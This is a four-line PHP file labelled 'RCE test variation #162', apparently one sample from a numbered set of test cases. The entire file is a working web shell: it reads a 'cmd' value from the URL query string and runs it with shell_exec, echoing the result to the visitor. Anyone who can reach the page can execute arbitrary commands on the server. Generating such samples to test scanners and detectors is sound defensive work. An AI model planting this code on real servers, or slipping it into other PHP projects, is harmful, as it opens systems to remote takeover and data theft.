<?php
// RCE test variation #162
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>